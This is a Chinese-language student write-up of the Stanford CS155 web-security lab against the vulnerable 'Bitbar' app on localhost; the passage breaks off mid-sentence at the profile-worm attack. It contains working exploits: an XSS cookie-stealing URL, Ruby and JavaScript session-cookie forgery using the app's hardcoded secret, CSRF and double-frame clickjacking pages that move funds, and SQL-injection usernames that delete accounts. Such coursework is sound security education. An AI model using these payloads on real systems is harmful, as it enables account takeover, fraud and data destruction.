## 准备工作

### spring 2022 环境搭建

**Docker 安装**

在 Windows 中安装 wsl2，然后安装 docker。

**Docker 环境搭建**

[下载](https://cs155.stanford.edu/) starter code，解压并运行

```shell
bash build_image.sh
```

![image-20220504124203960](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504124203960.png)

**启动服务器**

运行

```shell
bash start_server.sh
```

Bitbar 应用会运行在 [http://localhost:3000/](http://localhost:3000/)

![image-20220504124437974](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504124437974.png)

![image-20220504124448812](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504124448812.png)

### spring 2017 环境搭建

后来发现 spring 2017 和 spring 2020 环境不一样，因此需要重新搭建环境。

可以从官网下载配置好的虚拟机，也可以手动配置环境（可能会有网络问题）。

配置好后的界面：

![image-20220504202828382](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504202828382.png)

## Attack 1：Warn-up exercise: Cookie Theft

目标是窃取登陆用户的会话 cookie，然后发送到一个攻击者控制 url。

首先生成开头为：http://localhost:3000/profile?username= 的 url，访问该 url 时，将发送窃取的 cookie 到 http://localhost:3000/steal_cookie?cookie=[stolen cookie here]。

### 漏洞分析

**spring 2022 版**

查看 router.js 源码

```javascript
router.get('/profile', asyncMiddleware(async (req, res, next) => {
  if(req.session.loggedIn == false) {
    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
    return;
  };

  if(req.query.username != null) { // if visitor makes a search query
    const db = await dbPromise;
    const query = `SELECT * FROM Users WHERE username == "${req.query.username}";`;
    let result;
    try {
      result = await db.get(query);
    } catch(err) {
      result = false;
    }
    if(result) { // if user exists
      render(req, res, next, 'profile/view', 'View Profile', false, result);
    }
    else { // user does not exist
      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
    }
  } else { // visitor did not make query, show them their own profile
    render(req, res, next, 'profile/view', 'View Profile', false, req.session.account);
  }
}));
```

首先判断会话是否登录，然后将查询用户名拿出来，如果用户不存在，那么就会直接显示

```shell
${req.query.username} does not exist!
```

那么，就可以在 username 中填充 html 或者 js 代码。

**spring 2017 版**

查看 `config/routes.rb` 源码：

```ruby
  # This file controls how URLs are routed to controllers. 
  # Each rule has the following format:
  # http_method 'url_value' => 'controller#method'
  # 
  # For example:
  #   get 'profile' => 'user#view_profile'
  # routes the GET request to /profile to UserController's view_profile method 
  # Profile
  post 'set_profile' => 'user#set_profile'
  get 'profile' => 'user#view_profile'
```

可以看到将 `profile` 重定位到 `UserController` 的 `view_profile` 方法：

查看 `controller/user_controller.rb` 源码：

```ruby
  def view_profile
    @username = params[:username]
    @user = User.find_by_username(@username)
    if not @user
      if @username and @username != ""
        @error = "User #{@username} not found"
      elsif logged_in?
        @user = @logged_in_user
      end
    end
    
    render :profile
  end
```

先查找用户是否存在，如果用户不存在，那么就直接计算 `@username` 的值并且输出错误信息。

在 `helpers/application_helper.rb` 中可以看到：

```ruby
  def display_error(error_msg)
    if not error_msg or error_msg == ""
      return ""
    else 
      "<p class='error'>#{error_msg}</p>".html_safe
    end
  end
```

错误信息的 `class` 为 `error`。

在 `/view/user/profile.html.erb` 中，可以看到错误信息输出的位置：

```ruby
<% @title = "Profile" %>

<h3>View profile</h3>

<form class="pure-form" action="/profile" method="get">
    <input type="text" name="username" value="<%= @username %>" placeholder="username">
    <input class="pure-button" type="submit" value="Show">
</form>

<%= display_error(@error) %>
```

 ### 攻击原理

**spring 2022 版**

正常访问一个不存在的用户会出现一个蓝色错误信息：

![image-20220504161327501](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504161327501.png)

从上面的分析可知，可以使用 html 代码进行隐藏：

```html
<p hidden>hello
```

也可以使用 JavaScript 代码进行隐藏：

```javascript
const error_msg = document.getElementsByClassName('error')[0];
error_msg.parentNode.removeChild(error_msg);
```

或者

```javascript
document.getElementsByClassName('error')[0].hidden = true;
```

然后将 cookie 信息发送到指定 url：

```javascript
// 获取 cookie
const params = "cookie=" + encodeURIComponent(document.cookie);
const req = new XMLHttpRequest();
req.withCredentials=true;
req.onload = function() {
	// 发送完成后，重定向 url 到一个正常的页面
	window.location = 'http://localhost:3000/profile';
}
req.open('GET', 'http://localhost:3000/steal_cookie?' + params);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(null);
```

考虑到统一性，全部使用 javascript 代码，形成的 URL 如下：

```javascript
http://localhost:3000/profile?username=
<script>
    document.getElementsByClassName('error')[0].hidden = true;
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const req = new XMLHttpRequest();
    req.withCredentials=true;
    req.onload = function() {
        window.location = 'http://localhost:3000/profile';
    }
    req.open('GET', 'http://localhost:3000/steal_cookie?' + params);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send(null);
</script>
```

经过 URL 转义后的 URL：

```javascript
http://localhost:3000/profile?username=%0D%0A%3Cscript%3E%0D%0A%20%20%20%20document.getElementsByClassName(%27error%27)%5B0%5D.hidden%20%3D%20true%3B%0D%0A%20%20%20%20const%20params%20%3D%20%22cookie%3D%22%20%2B%20encodeURIComponent(document.cookie)%3B%0D%0A%20%20%20%20const%20req%20%3D%20new%20XMLHttpRequest()%3B%0D%0A%20%20%20%20req.withCredentials%3Dtrue%3B%0D%0A%20%20%20%20req.onload%20%3D%20function()%20%7B%0D%0A%20%20%20%20%20%20%20%20window.location%20%3D%20%27http%3A%2F%2Flocalhost%3A3000%2Fprofile%27%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20req.open(%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Fsteal_cookie%3F%27%20%2B%20params)%3B%0D%0A%20%20%20%20req.setRequestHeader(%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22)%3B%0D%0A%20%20%20%20req.send(null)%3B%0D%0A%3C%2Fscript%3E
```

使用浏览器访问该 URL，发现服务器命令行打印了相关信息：

![image-20220504162912232](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504162912232.png)

同时页面显示正常

![image-20220504163005167](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504163005167.png)

**spring 2017 版**

访问不存在的用户时会出现蓝色错误信息。

![image-20220504204905138](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504204905138.png)

但是，不能使用 html 标签来隐藏错误信息，因为标签之前有字符串 User，因此会固定显示一个 User。如下图所示：

![image-20220504205442208](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504205442208.png)

所以采用 js 代码的方式进行控件删除或隐藏，URL 与 2022 版相同：

```shell
http://localhost:3000/profile?username=%0D%0A%3Cscript%3E%0D%0A%20%20%20%20document.getElementsByClassName(%27error%27)%5B0%5D.hidden%20%3D%20true%3B%0D%0A%20%20%20%20const%20params%20%3D%20%22cookie%3D%22%20%2B%20encodeURIComponent(document.cookie)%3B%0D%0A%20%20%20%20const%20req%20%3D%20new%20XMLHttpRequest()%3B%0D%0A%20%20%20%20req.withCredentials%3Dtrue%3B%0D%0A%20%20%20%20req.onload%20%3D%20function()%20%7B%0D%0A%20%20%20%20%20%20%20%20window.location%20%3D%20%27http%3A%2F%2Flocalhost%3A3000%2Fprofile%27%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20req.open(%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Fsteal_cookie%3F%27%20%2B%20params)%3B%0D%0A%20%20%20%20req.setRequestHeader(%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22)%3B%0D%0A%20%20%20%20req.send(null)%3B%0D%0A%3C%2Fscript%3E
```

访问 URL 后，在服务端查看信息：

![image-20220504210106543](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504210106543.png)

## Attack 2: Session hijacking with Cookies

这个任务要求是登录 attacker 账户，欺骗应用以为你是 user1，然后将 user1 中的 BitBar 转入 attacker 中。

attacker 的密码是 evil，user1 的 ID 是 1。

### 漏洞分析

**spring 2022 版**

查看 cookie：

![image-20220504175455240](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504175455240.png)

cookie 实际上是经过 base64 编码后的信息，通过 `atob()` 解码：

![image-20220504175546565](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504175546565.png)

查看转账逻辑：

```js
router.post('/post_transfer', asyncMiddleware(async(req, res, next) => {
  if(req.session.loggedIn == false) {
    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
    return;
  };

  if(req.body.destination_username === req.session.account.username) {
    render(req, res, next, 'transfer/form', 'Transfer Bitbars', 'You cannot send money to yourself!', {receiver:null, amount:null});
    return;
  }

  const db = await dbPromise;
  let query = `SELECT * FROM Users WHERE username == "${req.body.destination_username}";`;
  const receiver = await db.get(query);
  if(receiver) { // if user exists
    const amount = parseInt(req.body.quantity);
    if(Number.isNaN(amount) || amount > req.session.account.bitbars || amount < 1) {
      render(req, res, next, 'transfer/form', 'Transfer Bitbars', 'Invalid transfer amount!', {receiver:null, amount:null});
      return;
    }

    req.session.account.bitbars -= amount;
    query = `UPDATE Users SET bitbars = "${req.session.account.bitbars}" WHERE username == "${req.session.account.username}";`;
    await db.exec(query);
    const receiverNewBal = receiver.bitbars + amount;
    query = `UPDATE Users SET bitbars = "${receiverNewBal}" WHERE username == "${receiver.username}";`;
    await db.exec(query);
    render(req, res, next, 'transfer/success', 'Transfer Complete', false, {receiver, amount});
  } else { // user does not exist
    let q = req.body.destination_username;
    if (q == null) q = '';

    let oldQ;
    while (q !== oldQ) {
      oldQ = q;
      q = q.replace(/script|SCRIPT|img|IMG/g, '');
    }
    render(req, res, next, 'transfer/form', 'Transfer Bitbars', `User ${q} does not exist!`, {receiver:null, amount:null});
  }
}));
```

可以看到，先检查 loggedIn 参数，然后将目标账户和 cookie 中的账户对比。如果目标账户存在则进行转账操作，否则对目标账户进行字符串进行反攻击处理。

**spring 2017 版**

> cookie 是如何储存的？

查看 ruby on rails 官方文档：[ActionDispatch::Session::CookieStore (rubyonrails.org)](https://api.rubyonrails.org/v5.2.1/classes/ActionDispatch/Session/CookieStore.html)

从 rails 3 开始，如果设置了 `secret_token` 那么，cookie 将会被签名，也就是说，修改 cookie 后要同时修改签名。

在 `config\initializers\secret_token.rb` 中设置了 `serect_token`

```ruby
Bitbar::Application.config.secret_token = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'
```

从 rails 4 开始，cookies 将会使用 `secret_key_base` 进行加密，并且进行签名。

例如，上面截取的 cookie：

```shell
_bitbar_session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVEkiJWNjMDRiZTU5YmY5YzY0ZTU4MDZjOWExNTVjMzU0YjYwBjsAVEkiCnRva2VuBjsARkkiG01fSkxVem5CM3o3TXRnVTI1a1Y5ancGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkJSSISc3RvbGVuX2Nvb2tpZQY7AEZJIkVfYml0YmFyX3Nlc3Npb249QkFoN0NFa2lEM05sYzNOcGIyNWZhV1FHT2daRlZFa2lKV05qTURSaVpUVTVZbVk1BjsAVA%3D%3D--b72471eecfd7b96deae4639af65f8fe42f324eaf
```

使用 `rails c` 打开 ruby 终端，查看 secret  相关配置：

![image-20220505150405368](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505150405368.png)

![image-20220505150418371](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505150418371.png)

secret_key_base 为 nil，没有对 cookie 进行加密，而是直接附加了一个签名。

这种情况下，cookie 经过 base64 编码后，连接一个 HMAC.sha1 签名形成了 cookie。

在命令行中查看分离 cookie 和 签名：

![image-20220505152409814](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505152409814.png)

使用 OpenSSL SHA1 算法计算签名，密钥为 secret_token。

![image-20220505152511359](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505152511359.png)

发现与分离出的签名一致，也验证了理论的正确性。

使用 base64 解码查看 cookie 的内容：

![image-20220505152718766](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505152718766.png)

这是一个 ruby 对象字节流，通过 Marshal 可以在字节流和 ruby 对象之间转换。比如：

![image-20220505153601565](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505153601565.png)

可以将 cookie 字节流转换为 ruby 哈希对象。

> cookie 中保存哪些内容?

查看源码，cookie 保存了 session_id，用户登录时的生成的 token，用户 id 和 stolen_cookie，stolen_cookie 是上一步攻击产生的内容。

> 应用如何验证用户身份？

查看 application_controller.rb 可以发现：

```ruby
  def load_logged_in_user
    @logged_in_user = User.find_by_id(session[:logged_in_id])
    if not session[:token]
      session[:token] = SecureRandom.urlsafe_base64
    end
  end
```

登录用户是由 session 的 logged_in_id 字段决定的，也就是说，可以通过伪造 logged_in_id 字段来伪造用户。

 ### 攻击原理

**spring 2022 版**

那么，只需要修改 cookie 中的 username 字段和 bitbars 字段即可。

```js
(function() {
	function getCookie(key) {
  const value = "; " + document.cookie;
  const parts = value.split("; " + key + "=");
	  if (parts.length == 2) return parts.pop().split(";").shift();
	};
	let session_str = getCookie('session')
	let session= JSON.parse(atob(session_str));
	session.account.username = "user1";
	session.account.bitbars = 200;
	// Overwrite the "session" cookie.
	document.cookie = "session=" + btoa(JSON.stringify(session));
})();
clear();
```

修改 cookie 中的 username 字段为 user1，bitbars 为 200，然后重新写入 cookie。

在浏览器中执行上面的 js 代码：

![image-20220504192942705](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504192942705.png)

刷新页面发现账户变为 user1。可以进行正常的转账操作：

![image-20220504193035924](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504193035924.png)

![image-20220504193055717](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504193055717.png)

**spring 2017 版**

目标是运行 a.sh 后，生成可以在浏览器 console 中运行的命令，使得当前用户变为 user1。

```shell
curl -s -o /dev/null -c cookie.txt -d "username=attacker&password=attacker" "http://localhost:3000/post_login"
cookie=`cat cookie.txt | grep bitbar | cut -f 7`
ruby shc.rb $cookie
```

首先使用 curl 模拟表单登录，获取 cookie 后传给 shc.rb 完成解析工作

```ruby
require 'openssl'
require 'cgi'
require 'base64'

if ARGV.length < 1
        puts "too few arguments"
        exit
end

cookie = CGI::unescape(ARGV[0])

data, digest = cookie.split('--')
secret_token = "0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08"
raise 'invalid message' unless digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, data)
message = Base64.strict_decode64(data)
cookie_dict =  Marshal.load(message)
cookie_dict["logged_in_id"] = 1
message = Base64.strict_encode64(Marshal.dump(cookie_dict))
digest_new = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, message)
cookie_new = message + '--' + digest_new
puts "document.cookie=\"_bitbar_session=#{cookie_new}\""
```

shc.rb 中，首先解析 cookie 的内容，然后修改 logged_in_id 为 user1 的 id = 1，然后经过 Marshal 字符流转换，base64 编码，SHA1 签名后形成最终的命令。

```shell
document.cookie="_bitbar_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTdjYTYyZTI0MjUyNDRhNDMzZThkY2Q5OTliZTdlN2UyBjsAVEkiCnRva2VuBjsARkkiG0NVQTlOQ3VTdEcwWm9vcUdKR2lzVGcGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkG--af3cbc206a2647443863e68ccc6b58424d61b3b9"
```

在浏览器中登录 attacker 账户，打开控制台，执行生成的命令：

![image-20220505165602753](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505165602753.png)

刷新页面后，用户变为 user1

![image-20220505165624118](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505165624118.png)

## Attack 3: Cross-site Request Forgery

### 漏洞分析

**spring 2022 版**

查看 app.js 源码：

```js
// adjust CORS policy (DO NOT CHANGE)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "null");
  res.header("Access-Control-Allow-Credentials", "true");
  next();
});

// set lax cookie policies (DO NOT CHANGE)
app.use(cookieSession({
  name: 'session',
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
  signed: false,
  sameSite: false,
  httpOnly: false,
}));
```

> `Access-Control-Allow-Origin` 是一个html5中添加的CORS(Cross-Origin Resource Sharing)头
>
> 跨域访问时，B站点 通过在响应头中添加 `Access-Control-Allow-Origin:http://siteA` 向浏览器表示该资源可被A站点正常访问使用。除非添加了`Access-Control-Allow-Origin`响应头，否则默认情况下一个站点的资源不允许来自于其他域的任何XMLHttpRequest请求。
>
> 对于B站点任意页面或者资源，如果想要允许被A站点访问，则应在页面或者资源请求的响应中添加相应头： `Access-Control-Allow-Origin: http://siteA.com`

在这里被设置为 null：

> **Note:** `null` [should not be used](https://w3c.github.io/webappsec-cors-for-developers/#avoid-returning-access-control-allow-origin-null): "It may seem safe to return `Access-Control-Allow-Origin: "null"`, but the serialization of the Origin of any resource that uses a non-hierarchical scheme (such as `data:` or `file:`) and sandboxed documents is defined to be "null". Many User Agents will grant such documents access to a response with an `Access-Control-Allow-Origin: "null"` header, and any origin can create a hostile document with a "null" Origin. The "null" value for the ACAO header should therefore be avoided."

设置为 null 之后，恶意文档可以设置 origin 为 null，进而访问站点资源。

> **`Access-Control-Allow-Credentials`** 响应头表示是否可以将对请求的响应暴露给页面。返回true则可以，其他值均不可以。
>
> Credentials可以是 cookies, authorization headers 或 TLS client certificates。

`Access-Control-Allow-Credentials` 设置为 true，说明客户端可以携带 cookies 等信息。

httpOnly指只能通过http的方式来访问cookie，也就是说无法通过js来访问，比如`document.cookie`。

网站的跨域控制存在问题，使得 CSRF 攻击成为可能。

**spring 2017 版**

查看 user_controller.rb 源码：

```ruby
  def post_transfer(failure_form=:transfer_form)
    if not logged_in?
      render "main/must_login"
      return
    end
    
    destination_username = params[:destination_username]
    @quantity = params[:quantity].to_i
    
    @error = ""
    @source_user = @logged_in_user
    @destination_user = User.find_by_username(destination_username)
    if not @destination_user
      @error = "The recipient does not exist."
    elsif @source_user.bitbars < @quantity
      @error = "You do not have enough bitbars!"
    elsif @destination_user.id == @source_user.id
      @error = "You cannot transfer bitbar to yourself!" 
    end
    
    if @error != ""
      render failure_form
    else
      @source_user.bitbars -= @quantity
      @destination_user.bitbars += @quantity
      @source_user.save
      @destination_user.save
      render :transfer_success
    end 
  end
```

发现转账操作直接利用已经登陆用户的 cookie 的信息进行转账操作，并且没有设置 CORS 策略。

 ### 攻击原理

**spring 2022 版**

网站的功能是向 attacker 用户转账 10 Bitbars，转账 API 是 `http://localhost:3000/post_transfer`。

通过查看转账页面源码，发现转账 API 是一个表单请求：

![image-20220504171245484](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220504171245484.png)

参数为 `destination_username` 和 `quantity`。

设置 `req.withCredentials=true` 表示携带 cookies 等信息。

```html
<!DOCTYPE html>
<html>
	<head>
		<script>
		// Tranfer to 'attacker'
		const params = "destination_username=attacker&quantity=10";
		const req = new XMLHttpRequest();
		req.withCredentials=true;
		req.onload = function() {
			// 结束之后加载到一个正常页面
			window.location = 'http://cs155.stanford.edu/';
		}
		req.open('POST', 'http://localhost:3000/post_transfer');
		req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		req.send(params);
		</script>
	</head>
	<body></body>
</html>
```

**spring 2017 版**

这一部分与上面的步骤相同，先登录 user1 的账户，然后访问 b.html：

![image-20220505191046575](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505191046575.png)

浏览器中发现服务器没有设置 `access-control-allow-origin` 所以将请求拦截，这是由于服务器后台没有设置 CROS 策略导致的，但是请求已经被发送给了服务器，xhr 转入错误状态。可以在服务器后台验证这一点：

访问 b.html 之后，后台出现了相关信息：

![image-20220505192059337](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505192059337.png)

查看 `view_users` 界面，发现转账成功：

![image-20220505192246707](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505192246707.png)

但是网页并没有跳转，这是因为 xhr 进入了 onerror，并没有调用 onload。那么，只需要在 onerror 的时候也跳转到正常页面即可。

```html
<!DOCTYPE html>
<html>
	<head>
		<script>
		// Tranfer to 'attacker'
		const params = "destination_username=attacker&quantity=10";
		const req = new XMLHttpRequest();
		req.withCredentials=true;
		req.onload = function() {
			// 结束之后加载到一个正常页面
			window.location = 'http://cs155.stanford.edu/';
		}
        req.onerror = function() {
            window.location = 'http://cs155.stanford.edu/'
        }
		req.open('POST', 'http://localhost:3000/post_transfer');
		req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		req.send(params);
		</script>
	</head>
	<body></body>
</html>
```

接着访问 b.html：

服务器后台有相应信息

![image-20220505194328239](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505194328239.png)

网页成功跳转

![image-20220505194341984](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505194341984.png)

查看账户信息，转账成功

![image-20220505194418770](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505194418770.png)

最新的 chrome 由于强制打开 SameSite 策略且无法关闭，建议使用 chrome 91 之前的版本。

下载好 chrome 90 版本之后，命令行方式启动 chrome，禁用 CORS 安全策略和 SameSite 策略。

```shell
chrome.exe --disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure --disable-site-isolation-trials --disable-web-security --user-data-dir="D:\temp"
```

![image-20220505210109029](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505210109029.png)

此时，进行 CSRF 攻击不会有任何警告。

![image-20220505212354507](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505212354507.png)

同时，网页正常跳转且转账成功。

![image-20220505212759527](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505212759527.png)

## Attack 4: Cross-site request forgery with user assistance

### 漏洞分析

这一部分是 spring 2017 独有的内容，需要设计 bp.html 可选 bp2.html，用户会根据 bp.html 中的指示来操作，交互完成后，将会把 10 bitbars 转入 attacker 账户。不同的是，目标页面是 `http://localhost:3000/super_secure_transfer`，目标页面有简单的 framebusting 防御代码，必须要想办法跳过这一防护手段。查看目标页面：

![image-20220505213859484](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220505213859484.png)

发现还需要输入一个 token。查看相关源码：

`user_controller.rb`

```ruby
  # Weak (and ostentatious) CSRF Protection
  def super_secure_transfer
    if not logged_in?
      render "main/must_login"
      return
    end
    @user = params[:user]
    @amount = params[:quantity]
    @token = session[:token]
    render :super_secure_transfer_form
  end

  def super_secure_post_transfer
    if not logged_in?
      render "main/must_login"
      return
    end

    @token = session[:token]
    if params[:tokeninput] != session[:token]
      @error = "Please enter the correct secret token!"
      render :super_secure_transfer_form
      return
    end
    post_transfer :super_secure_transfer_form
  end
```

发现 token 是用户登陆时随机生成的 base64 编码字符串。当输入的 token 不正确时，不会进行转账操作。

frame busting 相关技术：

> 基于Web Frame的攻击例如: ClickJacking，一般使用iframes去劫持用户的web session。目前最普遍的防御手段被称之为frame busting，即阻止当页面加载一个frame的时候对当前页面产生影响。
>
> Frame busting依靠防御代码来防止页面加载一个嵌套的frame，它是防御ClickJacking的主要手段。Frame busting同时还被用在保护login登录页面上，如果没有frame busting，那个这个login登录页面能够在任何的嵌套的子frame中打开。一些新型的高级ClickJacking技术使用Drag-and-Drop去提取敏感隐私数据并且注入到另一个frame中，完成数据窃取。
>
> 大多数的网站还仅仅是做了简单的代码防御，即把top.location(覆盖在原始页面上的"恶意"frame重定向回sefl.location("正确"的frame))。针对ClickJacking的防御并没有得到重视。

在本例子中，frame busting 的处理也十分简单：

`application.html.erb`

```html
  <% if not @disable_framebusting %>
      <script>
      // Framebusting.
      if(top.location != self.location){
              parent.location = self.location;
      }
      </script>
  <% end %> 
```

对于这种防御方法，我的理解是这样的:

这是一个对于frame覆盖的poc演示:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html>
<head>
    <title>Click Jack!</title>  
    <style type="text/css">  
        iframe
        {
            width: 900px;
            height: 250px; 

            /* Use absolute positioning to line up update button with fake button */
            position: absolute;
            top: -195px;
            left: -740px;
            z-index: 2;

            /* Hide from view */
            -moz-opacity: 0.5;
            opacity: 0.5;
            filter: alpha(opacity=0.5);
        }

        button
        {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 1;
            width: 120px;
        }
    </style>     
</head>
<body> 
     <iframe src="http://www.baidu.com" scrolling="no"></iframe>
     <button>Click Here!</button>
</body>
</html>
```

> 注意这个 `<iframe src="http://www.baidu.com" scrolling="no"></iframe>` 其实是在当前 [BOM](http://www.dreamdu.com/javascript/what_is_bom/)中插入了一个新的窗体window，而在一个 BOM 中，各个window之间的地位是平级的，区分它们的视觉参数只有z-index。当两个window产生覆盖时，这两个window之间就有了top和parent的父子关系，即frame覆盖的问题。

> 攻击者通过控制iframe的长、宽以及调整top、left的位置，可以把iframe页面内的任意部分覆盖到任何地方。
> 同时设置iframe的position为absolute，并将z-index的值设置为最大，以达到让iframe处于页面的最上层。最后，通过设置opacity来控制iframe页面的透明度，值0是完全不可见。
> 这样，就完成了一次点击劫持攻击。

> 之前介绍的普通的ClickJacking防御代码中只是简单的对parent.location进行赋值来进行frame覆盖的纠正。
> 这在当前页面只被攻击者覆盖了一个frame的情况能起到很好的防御作用。然后，如果攻击者在当前页面上覆盖了两个的frame(Double Frame)，情况就不一样了。

Double Frame 的情况下，访问 parent.location 就违反了主流浏览器的安全规则：**descendant frame navigation policy**。安全规则限制了网页的重定位，因此可以绕过简单的 frame busting 防护。

 ### 攻击原理

利用 Clickjacking 进行攻击，利用 Double Frame 绕过 frame busting 防护。

在 bp.html 中，伪造一个钓鱼页面。用 iframe 包装 bp2.html。

在 bp2.html 中，用 iframe 包装 `http://localhost:3000/super_secure_transfer`页面，达到 Double Frame 的效果。

![image-20220506001751204](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506001751204.png)

`bp.html`:

```html
<!DOCTYPE html>
<html>
    <head>
        <script>
            window.addEventListener("load", function() {
                function redirect() {
                    window.location = 'http://cs155.stanford.edu/'
                }
                function sendData() {
                    var xhr = new XMLHttpRequest();
                    var fd = new FormData(form);
                    xhr.onload = xhr.onerror = redirect();
                    xhr.withCredentials=true;
                    xhr.open("post", "http://localhost:3000/super_secure_post_transfer/");
                    xhr.send(fd);
                }
                var form = document.getElementById("myForm");
                form.addEventListener("submit", function (event) {
                    event.preventDefault();
                    sendData();
                });
            })
        </script>
    </head>
    <body>
        <form method="post" id="myForm">
            <label for="token">Input string below to verify...</label>
            <input type="text" name="destination_username" value="attacker" style="display: none;">
            <input type="text" name="quantity" value="10" style="display: none;">
            <input type="text" name="tokeninput" value="">
            <input type="submit" value="Verify">
        </form>
        <iframe src="bp2.html" scrolling="no" style="border:none;"></iframe>
    </body>
</html>
```

`bp2.html`

```html
<!DOCTYPE html>
<html>
<head>
    <style type="text/css">
        .wapper {
            width: 300px;
            height: 20px;
            overflow: hidden;
            position: relative;
        }
        .iframe {
            border: none;
            height: 1000px;
            position: absolute;
            top: -570px;
        }
    </style>
</head>
<body>
    <div class="wapper">    
        <iframe class="iframe" src="http://localhost:3000/super_secure_transfer/" scrolling="no"></iframe>
    </div>
</body>
</html>
```

在 bp2.html 中设置 iframe position 属性为 absolute 后，调整 iframe 大小使得刚好显示 token 内容。在 bp.html 中伪造一个表单，使得用户输入 token 的内容。

使用 javascript 拦截自定义表单 post 请求，然后使用 ajax 将请求发送给 `http://localhost:3000/super_secure_post_transfer`。发送成功或者失败都会重定向到一个正常页面。

当用户输入 token，点击 verify 之后，就会完成转账操作并跳转到正常页面。

![image-20220506002440139](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506002440139.png)

![image-20220506002459002](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506002459002.png)



## Attack 5: Little Bobby Tables (aka SQL Injection)

### 漏洞分析

题目要求输入一个特殊用户名字，创建后，点击 Close 会将 user3 和这个用户一起删除。

查看源码：

`user_controller.rb`

```ruby
  def post_delete_user
    if not logged_in?
      render "main/must_login"
      return
    end

    @username = @logged_in_user.username
    User.destroy_all("username = '#{@username}'")

    reset_session
    @logged_in_user = nil
    render "user/delete_user_success"
  end
```

删除用户时使用了 `username = '#{@username}'`。

新建一个用户 `test`，然后点击 Close 删除用户。在服务段查看执行的 sql 命令：

![image-20220506003518155](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506003518155.png)

用户名在 WHERE 子句中出现，如果用户名中包含 `'` 使得左半部分闭合，右半部分使用模糊查询 LIKE 子句，就可以实现删除多个用户。

 ### 攻击原理

基于上面的思路，可以设计用户名为：

```shell
user3' OR username LIKE 'user3%
```

或者

```shell
user3' OR username LIKE '% OR username LIKE%
```

等等，类似的名字。可以同时匹配到自身和 user3。

创建用户：

![image-20220506004231845](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506004231845.png)

删除用户：

![image-20220506004249876](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506004249876.png)

可以在后台看到执行的 SQL 语句：

![image-20220506004314032](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506004314032.png)

查看所有用户信息，发现 user3 已经被删除：

![image-20220506004350736](https://raw.githubusercontent.com/HSPK/pics/master/img/image-20220506004350736.png)

## Attack 6: Profile Worm

任务目标是设计一个 profile，当其他用户查看时，会向 attacker 用户转入 1 bitbar 并且替换当前用户的 profile 为此 profile。

转账和替换操作需要在 15s 内完成，浏览器地址栏需要保持在

